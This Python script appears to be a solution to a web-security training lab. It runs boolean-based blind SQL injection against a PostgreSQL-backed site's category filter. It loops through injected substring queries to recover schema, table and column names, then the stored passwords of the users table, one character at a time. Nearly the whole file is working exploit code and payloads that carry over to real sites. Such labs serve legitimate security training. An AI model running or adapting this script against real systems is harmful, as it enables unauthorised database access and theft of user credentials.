import requests
import string
from pwn import *


# the target website was running a PostgreSQL 12.20 instance at the backend. Site is vulnerable to SQL injection

class Exploit:


    def __init__(self):

        self.url = "https://0af500ec032094b681ca622e0008002c.web-security-academy.net/filter?category="
        self.headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"}
        self.characters = string.ascii_letters + string.digits + "_-, "
        self.p2 = log.progress("Payload")
        self.p1 = log.progress("Extracted")

    # databases (public, and others)
    def databases(self):

        pos = 0
        content = ""
        while True:
            pos+=1
            for char in self.characters:
                payload = "'+or+(select+substring((select+string_agg(schema_name,+',')+from+information_schema.schemata),%d,1))='%s'--+-" % (pos, char)
                self.p2.status(payload)

                r = requests.get(self.url+payload, headers=self.headers)

                if len(r.content) > 5000:
                    content+=char
                    self.p1.status(content)
                    break

    # tables (users, something else)
    def tables(self):

        pos = 0
        content = ""
        while True:
            pos+=1
            for char in self.characters:
                payload = "'+or+(select+substring((select+string_agg(table_name,+',')+from+information_schema.tables+where+table_schema='public'),%d,1))='%s'--+-" % (pos, char)
                self.p2.status(payload)

                r = requests.get(self.url+payload, headers=self.headers)

                if len(r.content) > 5000:
                    content+=char
                    self.p1.status(content)
                    break


    # columns (username, password, email)
    def col(self):

        pos = 0
        content = ""
        while True:
            pos+=1
            for char in self.characters:
                payload = "'+or+(select+substring((select+string_agg(column_name,+',')+from+information_schema.columns+where+table_schema='public'+and+table_name='users'),%d,1))='%s'--+-" % (pos, char)
                #self.p2.status(payload)

                r = requests.get(self.url+payload, headers=self.headers)

                if len(r.content) > 5000:
                    content+=char
                    self.p1.status(content)
                    break


    # content
    """
    username: administrator, carlos, wiener
    password: """
    def content(self):

        pos = 0
        content = ""
        while True:
            pos+=1
            for char in self.characters:
                payload = "'+or+(select+substring((select+string_agg(password,+',')+from+public.users),%d,1))='%s'--+-" % (pos, char)
                self.p2.status(payload)

                r = requests.get(self.url+payload, headers=self.headers)

                if len(r.content) > 5000:
                    content+=char
                    self.p1.status(content)
                    break

if __name__ == "__main__":
#    Exploit().databases()
#    Exploit().tables()
#    Exploit().col()
    Exploit().content()